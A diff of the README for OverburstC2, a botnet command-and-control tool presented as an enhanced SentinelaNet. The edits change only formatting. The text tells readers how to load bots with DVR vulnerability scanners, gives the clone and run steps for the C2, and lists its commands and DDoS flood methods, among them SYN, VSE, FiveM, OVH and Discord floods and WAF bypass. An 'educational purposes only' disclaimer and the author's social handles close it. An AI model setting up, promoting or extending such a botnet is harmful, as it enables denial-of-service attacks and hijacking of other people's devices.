@@ -1,23 +1,23 @@
 <div align="center">
-  <h1>OverburstC2 based on SentinelaNet</h1>
+<h1>OverburstC2 based on SentinelaNet</h1>
   
-  <p align="center">
+<p align="center">
     <img src="https://img.shields.io/badge/status-dev-blue?style=for-the-badge&logo=python" alt="Dev Status">
     <img src="https://img.shields.io/badge/version-1.0-blueviolet?style=for-the-badge&logo=github">
-  </p>
-  <p align="center">
+</p>
+<p align="center">
     <img src="https://github.com/user-attachments/assets/cadc2e29-6d15-4e1a-b70b-639ae325d7d8" alt="Banner">
-  </p>
-  <p>
-    This botnet is an enhanced version of SentinelaNet
-  </p>
+</p>
+<p>
+This botnet is an enhanced version of SentinelaNet
+</p>
 </div>
 
 <br/>
 
 ## Loading Bots
 
-You can use a collection of network security evaluation tools designed to identify vulnerabilities in various devices.  
+You can use a collection of network security evaluation tools designed to identify vulnerabilities in various devices.
 **Intended for educational purposes and authorized security testing only.**
 
 ### **DVR Scanner**
@@ -40,15 +40,15 @@ You can use a collection of network security evaluation tools designed to identi
 <br/>
 
 <div align="center">
- <h1>How to setup C2</h1>
+<h1>How to setup C2</h1>
 </div>
 
-### Requirements:
+###Requirements:
 ```
 colorama==0.4.6
 bcrypt==4.1.2
 ```
-### Commands:
+###Commands:
 ```
 git clone https://github.com/CirqueiraDev/OverburstC2.git
 ```
@@ -78,25 +78,25 @@ python main.py
 
 | Command | Description |
 |--------|-------------|
-| `help`     | Shows list of commands |
-| `botnet`   | Displays available botnet attack methods |
-| `bots`     | Shows all connected bots |
-| `stop`     | Stops all floods in progress |
-| `clear`    | Clears the console screen |
-| `exit`     | Disconnects from the C&C server |
+| `help` | Shows list of commands |
+| `botnet` | Displays available botnet attack methods |
+| `bots` | Shows all connected bots |
+| `stop` | Stops all floods in progress |
+| `clear` | Clears the console screen |
+| `exit` | Disconnects from the C&C server |
 
 ## Payload Methods Available
 
 | Method | Description |
 |--------|-------------|
-| `.UDP`     | Sends varying size UDP packets to overwhelm the target |
-| `.TCP`     | Continuously sends TCP packets to exhaust connections |
-| `.SYN`     | Sends SYN requests to flood pending TCP handshakes |
-| `.MIX`     | Alternates between TCP and UDP to bypass protections |
-| `.VSE`     | Sends Valve Source Engine protocol floods |
-| `.FIVEM`   | Specialized payload designed for FiveM servers |
-| `.OVHUDP`  | UDP floods with random payloads targeting specific ports |
-| `.OVHTCP`  | Randomized byte sequences and terminators to bypass WAFs |
+| `.UDP` | Sends varying size UDP packets to overwhelm the target |
+| `.TCP` | Continuously sends TCP packets to exhaust connections |
+| `.SYN` | Sends SYN requests to flood pending TCP handshakes |
+| `.MIX` | Alternates between TCP and UDP to bypass protections |
+| `.VSE` | Sends Valve Source Engine protocol floods |
+| `.FIVEM` | Specialized payload designed for FiveM servers |
+| `.OVHUDP` | UDP floods with random payloads targeting specific ports |
+| `.OVHTCP` | Randomized byte sequences and terminators to bypass WAFs |
 | `.DISCORD` | Specialized UDP packet targeting Discord services |
 
 <br/>
@@ -116,14 +116,14 @@ python main.py
 
 ## ⚠️ Legal Notice
 
-This project is strictly intended for **educational and research purposes only**.  
-Misuse of this software may be **illegal** and lead to **criminal penalties**.  
+This project is strictly intended for **educational and research purposes only**.
+Misuse of this software may be **illegal** and lead to **criminal penalties**.
 Always use cybersecurity knowledge to **defend systems**, never to attack them.
 
 ---
 
-## 👤 Author
+## 👤Author
 
 - **CirqueiraDev**
-- **Discord:** Cirqueira 
+- **Discord:** Cirqueira
 - [Instagram Profile](https://www.instagram.com/sirkeirax/)
